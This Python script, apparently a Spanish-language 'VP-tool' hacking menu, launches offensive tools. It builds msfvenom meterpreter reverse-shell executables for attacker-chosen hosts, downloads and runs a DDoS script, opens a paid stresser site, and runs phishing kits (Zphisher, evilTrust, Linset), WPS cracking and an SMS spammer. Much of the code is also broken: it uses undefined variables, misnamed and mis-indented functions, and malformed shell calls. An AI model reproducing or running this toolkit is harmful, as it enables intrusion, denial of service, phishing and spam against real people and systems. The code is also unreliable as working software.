import os
import time
import json
import subprocess
import webbrowser
import socket


banner = """

__     ______       _              _ 
\ \   / /  _ \     | |_ ___   ___ | | 
 \ \ / /| |_) |____| __/ _ \ / _ \| |
  \ V / |  __/_____| || (_) | (_) | |
   \_/  |_|         \__\___/ \___/|_|

                    creditos: NOT 4n0nym4to002#9766 
                              Yorkox0

"""
print(banner)

def decoracion():
    purple()
    # hola
    print("1                            --comprobacion de ip")
    print("2                           --> TWebRS")
    print("3                         --> msfVenom")
    print("4                           --> ghostF")
    print("5                        --> goyscript")
    print("6                      --> phoneinfoga")
    print("7                             --> Ddos")
    print("8                     --> freestresser")
    print("9                           --> Linset")
    print("10                        --> Zphisher")
    print("11                          --> wpscan")
    print("12                       --> eviltrust")
    print("13                        --> SPAM SMS")
    print("14                              --Exit")
    option = input("              +-> ")
    if option == "1":
        comprIP()
    if option == "2":
        TWebRS()
    if option == "3":
        msf() 
    if option == "4":
        Ghostf()
    if option == "5":
        Goyscript()
    if option == "6":
        phoneinfoga()
    if option == "7":
        Ddos()
    if option == "8":
        freestresser()
    if option == "9":
        Linset()

    if option == "10":
        phishing()

    if option == "11":
        wpscan()

    if option == "12":
        eviltrust()

    if option == "13":
        sms()

    if option == "14":
        os.system("clear")
        exit()

#   <--Return to Menu-->
def start_menu():
    os.system("clear")
    print(banner)
    decoracion()
#  <----comprobar IP---->
def comprIP():
     nombre_equipo = socket.gethostname()
     direccion_equipo = socket.gethostbyname(nombre_equipo)
     print("n-host" + nombre_equipo)
     print("IP:" + direccion_equipo)
     print("pulse 1 para salir")
     if x == "1":
         os.system(clear)
         start_menu()


#    <--Metasploit-->
def TWebRS():
        os.system("clear")
        red()
        print(banner)
        purple()
        print("              |                    1 -->> Download Tool")
        print("              |                    2 -->> Download Tool 2")
        print("              |                    3 -->> Execute Tool")
        print("              |                    4 -->> Exit")

        if x == "1":
            os.system("https://github.com/HackeRStrategy/Tool-Web-RS")
            print("Download!!!")
        if x == "2":
            os.system("cd")
            os.system("cd Tool-Web-RS")
            os.system("bash ToolWeb-RS.sh")
        if x == "3":
            os.system("cd")
            os.system("cd Tool-Web-RS")
            os.system("ls")
            os.system("cd Real-Scann-DNS")
            os.system("ls")
            os.system("python2 Real-DNS")
        if x == "4":
            os.system("clear")
            start_menu()

def msf():
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > download.exe")
        red()
        print("FileName == download.exe")
        time.sleep(2)
        while True:
            msf()

    if x == "2":
        
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx86.elf")
        red()
        print("FileName == downloadx86.elf")
        time.sleep(2)
        while True:
            msf()

    if x == "3":

        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        yellow()
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > downloadx64.elf")
        red()
        time.sleep(2)
        print("FileName == downloadx64.elf")
        while True:
            msf()

    if x == "4":
        start_menu()
def Ghostf():
        os.system("clear")
        print(banner)
        print("              |                    1 -->> Download Tool")
        print("              |                    2 -->> Execute Tool")
        print("              |                    3 -->> Exit")

        if x == "1":
            os.system("git clone https://github.com/ParikhKadam/ghost-1")
            os.system("cd ghost-1")
            os.system("ch mod +x install.sh")
            os.system("./install.sh")
            time.sleep(3)
            os.system("cd")
        if x == "2":
            os.system("ghost")
        if x == "3":
            os.system("clear")
            start_menu()


def Goyscript():
        os.system("clear")
        purple()
        print(banner)
        print("              |                    1 -->> Download Tool")
        print("                                   2 -->> Execute Tool ")
        print("                                   3 -->> Exit         ")

        if x == "1":
            os.system("git clone https://github.com/0x90/wps-scripts")
            yellow()
            print("Downloaded!!!")
        if x == "2":
            os.system("cd")
            os.system("cd wps-scripts")
            os.system("cd goyscript")
            os.system("bash goyscript.sh")
        if x == "3":
            os.system("clear")
            start_menu()






def phoneinfoga():
    os.system("clear")
    purple()
    print(banner)
    red()
    print("              |                    1 -->> Download Tool")
    print("                                   2 -->> Execute Tool ")
    print("                                   3 -->> Exit         ")
    if x == "1":
        os.system("git clone https://github.com/sundowndev/PhoneInfoga")
        os.system("cd PhoneInfoga/")
        os.system("python3 -m pip install -r requirements.txt")
        purple()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phoneinfoga()
        
    if x == "2":
        os.system("cd")
        os.system("cd PhoneInfoga/")
        print("the phoneinfoga commands are:python3 phoneinfoga scan +number")
        print("example: python3 phoneinfoga scan +36897153568")
    if x == "3":
        os.system("clear")
        start_menu()


def ddos():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        yellow()
        print("")
        print("Downloading...")
        os.system("curl https://raw.githubusercontent.com/yorkox0/exaple01/main/ddos.py -o ddos.py")
        red()
        print("Downloaded!!")
        time.sleep(2)
        while True:
            ddos()

    if x == "2":
        print("")
        os.system("python3 ddos.py")

    if x == "3":
        start_menu()

    def freestresser():
            os.system("clear")
    purple()
    print(banner)
    red() 
    print("                                   1 -->> Execute Tool         ")
    print("                                   2 -->> Stop Tool            ")
    print("                                   3 -->> Web Tool (recomended)")
    print("                                   4 -->> Exit                 ")
    if x == "1":
        subprocess.call("C:/home/kali/VPattack/phpcode/launch code.php")
    if x == "2":
        subprocess.call("C:/home/kali/VPattack/phpcode/stop code.php")
    if x == "3":
        webbrowser.open_new("https://freestresser.to/?__cf_chl_jschl_tk__=45e1187bd8ef3af28372608c2cbd68ca423c9a1e-1621773113-0-AVsHsvqcFh3SMVdfq3-ftaxmdeBVE6vr52ooNPEL0ezKYzQIQA0eHihtnAd6zxikrTpYKOZZviMTZzDibfkN7x14k6Rp1gujhue6iYJjQr6dpId5bMuyTj9Xz_dGxwi-j4gkFRf4OFzgI_J9RxbJvwjPYMvbghXFjDmhROY4kxZSN_8mcH0AqYcieJmuz45jw0NMBcPW06aV-W_nt67q1W0Ve0_-O-2IkGHfTjm_F-IwgwvSXd0dZrSuCX3F7NFLqLS-46XEJNb_MH3zpTozS0ylTFwFEwUZ1Ra6GvvO4bWNsfHiJpihgyyax7oRYrDO9piCA0L-FtKBJbb9xAlukffIDQ7CaS-Gnt6iWq8tZum-BMCwxvpzXlThzZxszq_sbxXR9cPO2Hx7FmumCeHAdrY")
    if x == "4":
        os.system("clear")
        start_menu()




def Linset():
    os.system("clear")
    purple()
    print(banner)
    red() 
    print("                                   1 -->> Download Tool 1       ")
    print("                                   2 -->> download Tool 2 (utilizar desp de haber instalado el down 1")
    print("                                   3 -->> download Tool 3 (utilizar desp de haber instalado el down 2")
    print("                                   4 -->> Execute Tool          ")
    print("                                   5 -->> Exit                  ")
    if x == "1":
        os.system("cd")
        os.system("git clone https://github.com/creadpag/linset.git ")
        os.system("leafpad /etc/apt/sources.list")
        os.system("deb http://ftp.de.debian.org/debian testing main contrib non-free")
        os.system("deb http://ftp.debian.org/debian/ jessie-updates main contrib non-free")
        os.system("deb http://security.debian.org/ jessie/updates main contrib non-free")
    if x == "2":
        os.system("apt-get update")
        os.system("apt-get upgrade")
    if x == "3":
        os.system("apt-get install isc-dhcp-server")
        os.system("apt-get install hostapd")
        os.system("apt-get install lighttpd")
        os.system("apt-get install Php5-cgi")
    if x == "4":
        os.system("cd")
        os.system(" cd linset")
        os.system("chmod +x linset")
        os.system("./linset")
    if x == "5":
        os.system("clear")
        start_menu()
def phishing():
    os.system("clear")

    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute tool")
    print("              |                    3 -->> Exit")
    x = input("              ↳ ")

    print("")
    if x == "1":
        
        yellow()
        os.system("git clone https://github.com/htr-tech/zphisher")
        print("")
        red()
        print("Downloaded!!")
        time.sleep(1)
        while True:
            phishing()

    if x == "2":
        print("")
        os.system("mv zphisher/* .")
        os.system("mv zphisher/.sites .")
        os.system("bash zphisher.sh")

    if x == "3":
        start_menu()

def wpscan():
    os.system("clear")
    red()
    print(banner)
    blue()
    print("")
    purple()
    web = input("Web whith https:// -->> ")
    yellow()
    print("Do you want to save it on web.txt? y/n")
    if input("-->> ") == "y":
        os.system("wpscan --url "+web +">> web.txt")
        red()
        print("Saved!!")
        time.sleep(1)
        while True:
            start_menu()
    else:
        os.system("wpscan --url "+web)
        red()
        input("Press INTRO to exit")
        while True:
            start_menu()

def eviltrust():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/s4vitar/evilTrust")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            eviltrust()

    if option == "2":
        os.system("mv evilTrust/* .")
        os.system("clear")
        os.system("sudo bash evilTrust.sh -m terminal")

    if option == "3":
        start_menu()

def sms():
    os.system("clear")
    red()
    print(banner)
    purple()
    print("              |                    1 -->> Download Tool")
    print("              |                    2 -->> Execute Tool")
    print("              |                    3 -->> Exit")

    option = input("              +-> ")
    if option == "1":
        print("Downloading...")
        yellow()
        os.system("git clone https://github.com/Darkmux/SETSMS")
        red()
        print("Downloaded!")
        time.sleep(2)
        while True:
            sms()

    if option == "2":
        os.system("mv SETSMS/* .")
        os.system("chmod 777 SETSMS.sh")
        os.system("bash SETSMS.sh")

    if option == "3":
        start_menu()

  
from sys import stdout

def red():
    RED = "\033[1;31m"
    stdout.write(RED)

def green():
    GREEN = "\033[0;32m"
    stdout.write(GREEN)


def blue():
    BLUE = "\033[1;34m"
    stdout.write(BLUE)

def yellow():
    YELLOW = "\033[1;33m"
    stdout.write(YELLOW)

def purple():
    PURPLE = "\033[1;35m"
    stdout.write(PURPLE)

def white():
    WHITE = "\033[1;37m"
    stdout.write(WHITE)

 # <-- iniciar la tool -->
 start_menu()
